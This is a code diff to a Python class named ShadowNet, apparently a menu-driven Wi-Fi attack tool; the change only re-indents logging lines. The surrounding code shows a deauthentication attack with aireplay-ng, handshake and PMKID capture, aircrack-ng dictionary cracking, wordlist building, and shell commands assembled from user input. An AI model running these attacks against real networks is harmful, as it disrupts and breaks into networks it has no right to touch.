@@ -480,9 +480,9 @@ class ShadowNet:
             p_error("[!] NO TARGET SPECIFIED")
             return
             
-    p_info(f"[*] SCANNING {target}...")
-    cmd = f"nmap -sn {target}"
-    subprocess.run(cmd, shell=True)
+        p_info(f"[*] SCANNING {target}...")
+        cmd = f"nmap -sn {target}"
+        subprocess.run(cmd, shell=True)
         
         input("\n[PRESS ENTER TO CONTINUE]")
 
@@ -504,7 +504,7 @@ class ShadowNet:
             input("\n[PRESS ENTER TO CONTINUE]")
             return
 
-    print("\nModes:")
+        print("\nModes:")
         print("  [1] PMKID attack (hcxdumptool)")
         print("  [2] Handshake capture (airodump+deauth)")
         print("  [3] Both (PMKID then handshake)")
@@ -670,7 +670,7 @@ class ShadowNet:
         if not client_mac:
             client_mac = "FF:FF:FF:FF:FF:FF"
         
-    p_info(f"[*] LAUNCHING DEAUTH ATTACK...")
+        p_info(f"[*] LAUNCHING DEAUTH ATTACK...")
         cmd = f"sudo aireplay-ng -0 {packets} -a {target_bssid} -c {client_mac} {interface}"
         subprocess.run(cmd, shell=True)
         
@@ -703,8 +703,8 @@ class ShadowNet:
             p_error("[!] HANDSHAKE FILE NOT FOUND")
             return
         
-    p_info(f"[*] USING WORDLIST: {wordlist}")
-    p_info(f"[*] STARTING BRUTEFORCE ATTACK...")
+        p_info(f"[*] USING WORDLIST: {wordlist}")
+        p_info(f"[*] STARTING BRUTEFORCE ATTACK...")
         
         cmd = f"aircrack-ng -w {wordlist} {handshake_file}"
         subprocess.run(cmd, shell=True)
@@ -720,8 +720,8 @@ class ShadowNet:
         channel = input("[+] TARGET CHANNEL: ")
         output_file = input("[+] OUTPUT FILE NAME: ") or "handshake"
         
-    p_info(f"[*] CAPTURING HANDSHAKE FROM {target_bssid}")
-    p_warn("[*] CTRL+C TO STOP CAPTURE")
+        p_info(f"[*] CAPTURING HANDSHAKE FROM {target_bssid}")
+        p_warn("[*] CTRL+C TO STOP CAPTURE")
         
         cmd = f"sudo airodump-ng -c {channel} --bssid {target_bssid} -w {output_file} {interface}"
         try:
@@ -762,8 +762,8 @@ class ShadowNet:
             p_error("[!] HANDSHAKE FILE NOT FOUND")
             return
         
-    p_info(f"[*] USING WORDLIST: {wordlist}")
-    p_info(f"[*] LAUNCHING DICTIONARY ATTACK...")
+        p_info(f"[*] USING WORDLIST: {wordlist}")
+        p_info(f"[*] LAUNCHING DICTIONARY ATTACK...")
         cmd = f"aircrack-ng -w {wordlist} {handshake_file}"
         subprocess.run(cmd, shell=True)
         
@@ -805,7 +805,7 @@ class ShadowNet:
             for password in set(filtered_wordlist):
                 f.write(password + '\n')
         
-    p_ok(f"[+] GENERATED {len(set(filtered_wordlist))} PASSWORDS")
+        p_ok(f"[+] GENERATED {len(set(filtered_wordlist))} PASSWORDS")
     
     def wordlist_management(self):
         p_title("\n[*] WORDLIST MANAGEMENT MODULE")
@@ -862,8 +862,8 @@ class ShadowNet:
             p_error(f"[!] ERROR READING WORDLIST: {e}")
     
     def create_custom_wordlist(self):
-    p_title("\n[*] CUSTOM WORDLIST CREATOR")
-    print(color_text("=" * 30, Fore.CYAN))
+        p_title("\n[*] CUSTOM WORDLIST CREATOR")
+        print(color_text("=" * 30, Fore.CYAN))
         
         output_file = input("[+] OUTPUT FILENAME: ") or "custom_wordlist.txt"
         
@@ -931,8 +931,8 @@ class ShadowNet:
             print(f"[+] TOTAL PASSWORDS: {len(set(passwords))}")
     
     def merge_wordlists(self):
-    p_title("\n[*] WORDLIST MERGER")
-    print(color_text("=" * 20, Fore.CYAN))
+        p_title("\n[*] WORDLIST MERGER")
+        print(color_text("=" * 20, Fore.CYAN))
         
         wordlists = []
         print("[*] ENTER WORDLIST PATHS (EMPTY LINE TO FINISH)")
@@ -968,8 +968,8 @@ class ShadowNet:
                 if password:
                     f.write(password + '\n')
         
-    p_ok(f"[+] MERGED WORDLIST CREATED: {output_file}")
-    p_ok(f"[+] TOTAL UNIQUE PASSWORDS: {len(all_passwords)}")
+        p_ok(f"[+] MERGED WORDLIST CREATED: {output_file}")
+        p_ok(f"[+] TOTAL UNIQUE PASSWORDS: {len(all_passwords)}")
     
     def wordlist_stats(self):
         wordlist_path = input("[+] WORDLIST PATH: ")
@@ -1028,7 +1028,7 @@ class ShadowNet:
         else:
             return
         
-    p_info(f"[*] DOWNLOADING {filename}...")
+        p_info(f"[*] DOWNLOADING {filename}...")
         try:
             import urllib.request
             urllib.request.urlretrieve(url, filename)
@@ -1148,7 +1148,7 @@ class ShadowNet:
         else:
             return
         
-    p_info(f"[*] EXECUTING: {cmd}")
+        p_info(f"[*] EXECUTING: {cmd}")
         subprocess.run(cmd, shell=True)
         
         input("\n[PRESS ENTER TO CONTINUE]")
